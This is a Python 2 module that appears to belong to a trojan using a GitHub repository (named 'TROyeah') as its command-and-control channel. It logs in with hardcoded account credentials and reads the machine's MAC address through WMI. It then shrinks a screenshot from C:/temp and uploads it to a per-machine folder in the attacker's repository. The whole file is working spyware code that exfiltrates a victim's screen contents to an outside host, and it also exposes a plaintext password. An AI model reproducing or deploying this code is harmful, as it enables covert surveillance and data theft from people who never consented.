import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import wmi
import pythoncom
import Image as image
from github3 import *


def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    return repo

def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")


def upScreen(rep,msg,pcname):
    
    if rep.contents("data/"+pcname+"/screen.bmp") == None :
#	print "ip"
        rep.create_file("data/"+pcname+"/screen.bmp",pcname +" screen autosave file create",msg)
    con = rep.contents("data/"+pcname+"/screen.bmp")
    print "goto upFile"
    upFile(con,msg,"upload screen")


#
def upFile(oricon,msg,comment):
    if oricon == None : print "dont have such file\n" ;return;
    oricon.update(comment,msg)


def resizeImg(**args):
    args_key = {'ori_img':'','dst_img':'','dst_w':'','dst_h':'','save_q':75}
    arg = {}
    for key in args_key:
        if key in args:
            arg[key] = args[key]

    im = image.open(arg['ori_img'])
    ori_w,ori_h = im.size
    widthRatio = heightRatio = None
    ratio = 1
    if (ori_w and ori_w > arg['dst_w']) or (ori_h and ori_h > arg['dst_h']):
        if arg['dst_w'] and ori_w > arg['dst_w']:
            widthRatio = float(arg['dst_w']) / ori_w #正确获取小数的方式
        if arg['dst_h'] and ori_h > arg['dst_h']:
            heightRatio = float(arg['dst_h']) / ori_h

        if widthRatio and heightRatio:
            if widthRatio < heightRatio:
                ratio = widthRatio
            else:
                ratio = heightRatio

        if widthRatio and not heightRatio:
            ratio = widthRatio
        if heightRatio and not widthRatio:
            ratio = heightRatio

        newWidth = int(ori_w * ratio)
        newHeight = int(ori_h * ratio)
    else:
        newWidth = ori_w
        newHeight = ori_h

    im.resize((newWidth,newHeight),image.ANTIALIAS).save(arg['dst_img'],quality=arg['save_q'])





def run(m):
    pythoncom.CoInitialize()
    repo=connect_to_github()
    ori_img = 'C:/temp/scr.bmp'
    dst_img = 'C:/temp/scr2.bmp'
    dst_w = 800
    dst_h = 800
    save_q = 50
    resizeImg(ori_img=ori_img,dst_img=dst_img,dst_w=dst_w,dst_h=dst_h,save_q=save_q)
    fileHandle = None
    print "screen"
    time.sleep(2)
    fileHandle=open ("C:/temp/scr2.bmp", 'rb' )
    print "no problem"
    msg = fileHandle.read()
    upScreen(repo,msg,m)
    fileHandle.close()
